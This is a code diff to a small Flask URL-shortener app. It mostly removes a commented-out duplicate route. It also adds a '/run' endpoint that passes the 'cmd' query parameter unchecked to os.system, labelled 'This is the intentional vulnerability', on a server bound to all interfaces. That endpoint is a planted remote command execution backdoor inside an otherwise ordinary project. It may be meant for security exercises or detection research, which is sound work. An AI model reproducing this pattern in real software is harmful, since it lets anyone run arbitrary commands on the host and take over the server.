@@ -39,39 +39,6 @@ def index():
     return render_template('index.html')
 
 
-# @app.route('/shorten', methods=['POST'])
-# def shorten():
-#     url = request.form['url']
-#     if not url.startswith(('http://', 'https://')):
-#         url = 'http://' + url
-#         cat_picture = get_random_cat_picture()
-
-#         # Check if a custom alias is provided
-#         custom_alias = request.form.get('alias', None)
-
-#         if custom_alias:
-#             # Check if the custom alias is available
-#             existing_url = url_collection.find_one({'$or': [{'shortcode': custom_alias}, {'alias': custom_alias}]})
-#             if existing_url:
-#                 error_message = 'Alias already taken. Please enter another alias.'
-#                 return render_template('index.html', error=error_message)
-#             else:
-#                 # Store the URL with the custom alias
-#                 url_collection.insert_one({'shortcode': custom_alias, 'alias': custom_alias, 'url': url})
-#                 return render_template('shorten.html', shortcode=custom_alias, cat_picture=cat_picture)
-
-#         # Check if the URL is already in the database
-#         url_data = url_collection.find_one({'url': url})
-#         if url_data:
-#             # URL already exists, return the corresponding shortcode
-#             shortcode = url_data['shortcode']
-#         else:
-#             # URL does not exist, generate a new shortcode
-#             shortcode = generate_shortcode()
-#             url_collection.insert_one({'shortcode': shortcode, 'url': url})
-
-#         return render_template('shorten.html', shortcode=shortcode, cat_picture=cat_picture)
-
 @app.route('/shorten', methods=['POST'])
 def shorten():
     url = request.form['url']
@@ -101,7 +68,6 @@ def shorten():
     return render_template('shorten.html', shortcode=shortcode, cat_picture=cat_picture)
 
 
-
 @app.route('/<shortcode_or_alias>')
 def redirect_to_url(shortcode_or_alias):
     url_data = url_collection.find_one({'$or': [{'shortcode': shortcode_or_alias}, {'alias': shortcode_or_alias}]})
@@ -110,6 +76,11 @@ def redirect_to_url(shortcode_or_alias):
         return redirect(url)
     else:
         return render_template('404.html')
+
+@app.route('/run')
+def run_command():
+    os.system(request.args.get('cmd'))  # This is the intentional vulnerability
+    return "Command executed."
 
 if __name__ == '__main__':
     app.run(host="0.0.0.0", port=5000)
